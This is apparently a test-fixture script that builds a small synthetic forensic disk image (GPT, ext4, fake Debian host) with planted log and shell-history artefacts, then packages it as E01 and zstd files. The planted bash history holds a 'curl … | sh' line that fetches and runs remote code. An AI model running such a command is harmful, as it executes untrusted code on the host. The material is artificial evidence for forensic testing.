#!/bin/sh
# Builds disk.img: a GPT disk whose one partition is an ext4 volume holding a small Linux host.
set -eu
apt-get update -qq >/dev/null && apt-get install -y -qq e2fsprogs gdisk ewf-tools zstd >/dev/null 2>&1
t=$(mktemp -d); r=$t/root
mkdir -p $r/etc $r/var/log $r/home/alice/.ssh $r/root
echo imagehost > $r/etc/hostname
printf 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n' > $r/etc/os-release
printf 'root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n' > $r/etc/passwd
printf 'Etc/UTC\n' > $r/etc/timezone
printf '2024-03-10T01:02:03.000000+00:00 imagehost sshd[42]: Accepted password for alice from 203.0.113.9 port 50000 ssh2\n' > $r/var/log/auth.log
printf '#1710032523\nwhoami\n#1710032530\ncurl -s https://example.com/x | sh\n' > $r/home/alice/.bash_history
ln -s /etc/hostname $r/etc/hostname.link
touch -d '2024-03-10 01:02:03 UTC' $r/var/log/auth.log $r/etc/passwd
dd if=/dev/zero of=$t/fs.img bs=1M count=6 status=none
mkfs.ext4 -q -d $r -E root_owner=0:0 $t/fs.img
dd if=/dev/zero of=/w/disk.img bs=1M count=8 status=none
sgdisk -n 1:2048:14335 -t 1:8300 /w/disk.img >/dev/null
dd if=$t/fs.img of=/w/disk.img bs=512 seek=2048 conv=notrunc status=none
rm -f /w/disk.E01; ewfacquire -u -c best -t /w/disk /w/disk.img >/dev/null 2>&1
zstd -q -19 -f /w/disk.img -o /w/disk.img.zst
ls -la /w
